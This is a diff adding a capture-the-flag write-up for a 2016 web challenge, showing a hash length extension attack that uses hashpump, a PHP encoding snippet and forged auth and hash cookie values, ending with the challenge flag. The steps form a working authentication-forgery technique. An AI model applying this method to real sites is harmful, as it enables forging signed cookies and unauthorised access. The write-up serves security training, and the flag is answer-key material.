@@ -1,0 +1,43 @@
+# MCSC Challenge ENSIAS 2016
+# Category: Web
+# Author: Faid Amine
+# Points: 250
+
+Write-up : 
+
+Essentially what we want to do is set the auth value to b=1; and generate a valid hash from the new string that has b=1; appended to it.
+
+To do this I used hash pump:
+
+Step 1 : 
+root@bt:~/Hspp# ./hashpump -d ";0:b" -a ";1:b" -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 -k 6
+d1f264671df81a7cd03d255e04459cbe419bccac0d651ba2d512f93ca8d38201
+
+0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b
+
+
+Step 2 : 
+<?php
+print urlencode(strrev(";0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b"));
+?>
+
+Step 3 :
+root@bt:~/Desktop/MCSC16# php conv.php 
+
+b%3A1%3BP%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B
+
+
+
+Step 4 : Insert As Cookies 
+
+hash = d1f264671df81a7cd03d255e04459cbe419bccac0d651ba2d512f93ca8d38201
+
+
+auth = b%3A1%3BP%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B
+
+
+And you Get the Flag
+
+MCSC6{Hash!nG_Not_alway5_Th3_S4f3_Way}
+
+# D3siprox
